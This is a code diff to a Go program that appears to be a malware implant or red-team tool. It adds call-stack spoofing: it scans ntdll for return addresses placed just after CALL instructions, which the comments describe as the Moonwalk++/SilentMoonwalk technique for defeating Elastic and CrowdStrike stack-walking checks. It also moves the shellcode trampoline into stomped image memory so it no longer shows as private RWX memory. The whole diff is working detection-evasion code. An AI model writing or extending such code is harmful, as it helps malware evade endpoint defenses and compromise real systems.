@@ -37,14 +37,20 @@ import (
 
 var (
 	hgOnce       sync.Once
-	hgGadget     uintptr // ntdll `ret` gadget address
-	hgTrampoline uintptr // our 39-byte RWX trampoline
+	hgGadget     uintptr // return address placed on stack — CALL gadget preferred, RET fallback
+	hgTrampoline uintptr // spoof trampoline stub
 )
 
 // initSpoofing initialises the gadget and trampoline on first use.
+// Prefers a CALL gadget (Moonwalk++ style) so the forged return address passes
+// the "byte before is CALL" check that Elastic/CS stack-walking rules enforce.
+// Falls back to a plain RET gadget if no CALL site is found.
 func initSpoofing() {
 	hgOnce.Do(func() {
-		hgGadget = findNtdllRetGadget()
+		hgGadget = findCallReturnGadget()
+		if hgGadget == 0 {
+			hgGadget = findNtdllRetGadget()
+		}
 		if hgGadget == 0 {
 			return
 		}
@@ -54,6 +60,58 @@ func initSpoofing() {
 
 // ────────────────────────────────────────────────────────────────────────────
 // Gadget discovery
+
+// findCallReturnGadget scans ntdll .text for a position X such that
+// memory[X-5..X-1] is a CALL rel32 (E8 xx xx xx xx) instruction.
+//
+// When this address is placed as a return address on the stack, EDR stack
+// walkers that validate "is there a CALL instruction before the return site"
+// (Elastic EQL hunt rules, CrowdStrike stack-walking) see a legitimate call
+// site inside ntdll rather than an injected stub address.  This is the core
+// of the Moonwalk++/SilentMoonwalk technique.
+func findCallReturnGadget() uintptr {
+	base := hgNtdllBase()
+	if base == 0 {
+		return 0
+	}
+	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
+	peBase := base + uintptr(e_lfanew)
+	numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
+	optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))
+	sectionBase := peBase + 24 + uintptr(optHeaderSize)
+	const (
+		sectionHeaderSize  = 40
+		sectionVSizeOffset = 8
+		sectionVAOffset    = 12
+		sectionCharOffset  = 36
+		imageScnMemExecute = 0x20000000
+	)
+	for i := uint16(0); i < numSections; i++ {
+		sh := sectionBase + uintptr(i)*sectionHeaderSize
+		if *(*uint32)(unsafe.Pointer(sh+sectionCharOffset))&imageScnMemExecute == 0 {
+			continue
+		}
+		va := *(*uint32)(unsafe.Pointer(sh + sectionVAOffset))
+		vsz := *(*uint32)(unsafe.Pointer(sh + sectionVSizeOffset))
+		if va == 0 || vsz <= 5 {
+			continue
+		}
+		start := base + uintptr(va)
+		// Search for a position X where memory[X-5] == 0xE8 (CALL rel32).
+		// Skip positions that land on 0x00 (null regions) or 0xCC (INT3 padding).
+		for off := uintptr(5); off < uintptr(vsz); off++ {
+			if *(*byte)(unsafe.Pointer(start+off-5)) != 0xE8 {
+				continue
+			}
+			cur := *(*byte)(unsafe.Pointer(start + off))
+			if cur == 0x00 || cur == 0xCC {
+				continue
+			}
+			return start + off
+		}
+	}
+	return 0
+}
 
 // findNtdllRetGadget finds the first `ret` (0xC3) byte in ntdll's first
 // executable section.  Any `ret` in ntdll code works — the stack walker only
@@ -141,7 +199,9 @@ var trampolineBytes = [39]byte{
 	0xFF, 0xE0,                                // jmp  rax
 }
 
-// allocSpoofTrampoline copies trampolineBytes into a private RWX allocation.
+// allocSpoofTrampoline copies trampolineBytes into executable memory.
+// Uses stompAlloc (MEM_IMAGE) when available so the trampoline pages show
+// Type=MEM_IMAGE rather than the private-RWX IOC.
 func allocSpoofTrampoline() uintptr {
 	addr := hgAlloc(uint32(len(trampolineBytes)))
 	if addr == 0 {
@@ -149,6 +209,8 @@ func allocSpoofTrampoline() uintptr {
 	}
 	dst := (*[len(trampolineBytes)]byte)(unsafe.Pointer(addr))
 	*dst = trampolineBytes
+	// Flip RWX → RX once written; stomped pages no longer appear private-RWX.
+	stompFinalize(addr, uint32(len(trampolineBytes)))
 	return addr
 }
 
